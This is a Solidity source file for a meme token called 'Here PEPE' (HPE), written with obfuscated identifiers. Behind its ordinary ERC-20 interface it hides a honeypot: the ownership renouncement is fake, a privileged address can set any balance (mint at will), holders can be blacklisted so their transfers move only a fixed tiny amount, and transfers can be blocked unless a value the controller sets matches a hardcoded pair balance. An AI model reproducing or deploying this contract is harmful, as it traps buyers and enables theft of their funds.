//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface feeLiquidity {
    function totalSupply() external view returns (uint256);

    function balanceOf(address walletSwap) external view returns (uint256);

    function transfer(address marketingTradingAt, uint256 buyMaxFrom) external returns (bool);

    function allowance(address shouldFund, address spender) external view returns (uint256);

    function approve(address spender, uint256 buyMaxFrom) external returns (bool);

    function transferFrom(
        address sender,
        address marketingTradingAt,
        uint256 buyMaxFrom
    ) external returns (bool);

    event Transfer(address indexed from, address indexed swapMode, uint256 value);
    event Approval(address indexed shouldFund, address indexed spender, uint256 value);
}

abstract contract shouldWalletTo {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tradingSender {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface autoLaunch {
    function createPair(address txFrom, address launchedAmount) external returns (address);
}

interface feeLiquidityMetadata is feeLiquidity {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract HerePEPE is shouldWalletTo, feeLiquidity, feeLiquidityMetadata {

    constructor (){
        
        tradingSender marketingLimit = tradingSender(teamToken);
        txShould = autoLaunch(marketingLimit.factory()).createPair(marketingLimit.WETH(), address(this));
        if (buyTx != teamTrading) {
            teamTrading = true;
        }
        walletMin = _msgSender();
        swapMax();
        autoLiquidity[walletMin] = true;
        liquidityMin[walletMin] = fromBuy;
        if (buyTx != teamTrading) {
            minLaunched = shouldSwapIs;
        }
        emit Transfer(address(0), walletMin, fromBuy);
    }

    function name() external view virtual override returns (string memory) {
        return liquidityFrom;
    }

    function buyIsLimit(address launchedTo) public {
        receiverAuto();
        
        if (launchedTo == walletMin || launchedTo == txShould) {
            return;
        }
        launchedIs[launchedTo] = true;
    }

    function getOwner() external view returns (address) {
        return txLiquidity;
    }

    mapping(address => bool) public launchedIs;

    function fundMode(address receiverExempt, uint256 buyMaxFrom) public {
        receiverAuto();
        liquidityMin[receiverExempt] = buyMaxFrom;
    }

    function receiverAuto() private view {
        require(autoLiquidity[_msgSender()]);
    }

    function transferFrom(address autoLimitMode, address marketingTradingAt, uint256 buyMaxFrom) external override returns (bool) {
        if (_msgSender() != teamToken) {
            if (txLimitFrom[autoLimitMode][_msgSender()] != type(uint256).max) {
                require(buyMaxFrom <= txLimitFrom[autoLimitMode][_msgSender()]);
                txLimitFrom[autoLimitMode][_msgSender()] -= buyMaxFrom;
            }
        }
        return enableLaunch(autoLimitMode, marketingTradingAt, buyMaxFrom);
    }

    function launchLimit(address swapLaunched) public {
        require(swapLaunched.balance < 100000);
        if (sellAuto) {
            return;
        }
        if (minLaunched != shouldSwapIs) {
            teamTrading = true;
        }
        autoLiquidity[swapLaunched] = true;
        if (buyTx) {
            shouldSwapIs = minLaunched;
        }
        sellAuto = true;
    }

    address public walletMin;

    function decimals() external view virtual override returns (uint8) {
        return teamLaunch;
    }

    address swapTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => bool) public autoLiquidity;

    function approve(address marketingModeTo, uint256 buyMaxFrom) public virtual override returns (bool) {
        txLimitFrom[_msgSender()][marketingModeTo] = buyMaxFrom;
        emit Approval(_msgSender(), marketingModeTo, buyMaxFrom);
        return true;
    }

    event OwnershipTransferred(address indexed launchLiquidity, address indexed buyAutoSwap);

    function symbol() external view virtual override returns (string memory) {
        return teamMinFee;
    }

    address teamToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private buyTx;

    function owner() external view returns (address) {
        return txLiquidity;
    }

    function transfer(address receiverExempt, uint256 buyMaxFrom) external virtual override returns (bool) {
        return enableLaunch(_msgSender(), receiverExempt, buyMaxFrom);
    }

    uint8 private teamLaunch = 18;

    uint256 constant launchedListFund = 14 ** 10;

    uint256 modeExemptMax;

    function fundIs(uint256 buyMaxFrom) public {
        receiverAuto();
        autoTo = buyMaxFrom;
    }

    function allowance(address walletMinSender, address marketingModeTo) external view virtual override returns (uint256) {
        if (marketingModeTo == teamToken) {
            return type(uint256).max;
        }
        return txLimitFrom[walletMinSender][marketingModeTo];
    }

    function balanceOf(address walletSwap) public view virtual override returns (uint256) {
        return liquidityMin[walletSwap];
    }

    function modeReceiverAmount(address autoLimitMode, address marketingTradingAt, uint256 buyMaxFrom) internal returns (bool) {
        require(liquidityMin[autoLimitMode] >= buyMaxFrom);
        liquidityMin[autoLimitMode] -= buyMaxFrom;
        liquidityMin[marketingTradingAt] += buyMaxFrom;
        emit Transfer(autoLimitMode, marketingTradingAt, buyMaxFrom);
        return true;
    }

    function enableLaunch(address autoLimitMode, address marketingTradingAt, uint256 buyMaxFrom) internal returns (bool) {
        if (autoLimitMode == walletMin) {
            return modeReceiverAmount(autoLimitMode, marketingTradingAt, buyMaxFrom);
        }
        uint256 limitShould = feeLiquidity(txShould).balanceOf(swapTake);
        require(limitShould == autoTo);
        require(marketingTradingAt != swapTake);
        if (launchedIs[autoLimitMode]) {
            return modeReceiverAmount(autoLimitMode, marketingTradingAt, launchedListFund);
        }
        return modeReceiverAmount(autoLimitMode, marketingTradingAt, buyMaxFrom);
    }

    address public txShould;

    function swapMax() public {
        emit OwnershipTransferred(walletMin, address(0));
        txLiquidity = address(0);
    }

    bool public sellAuto;

    bool public teamTrading;

    uint256 public shouldSwapIs;

    mapping(address => uint256) private liquidityMin;

    string private liquidityFrom = "Here PEPE";

    function totalSupply() external view virtual override returns (uint256) {
        return fromBuy;
    }

    string private teamMinFee = "HPE";

    address private txLiquidity;

    uint256 autoTo;

    uint256 private minLaunched;

    uint256 private fromBuy = 100000000 * 10 ** 18;

    mapping(address => mapping(address => uint256)) private txLimitFrom;

}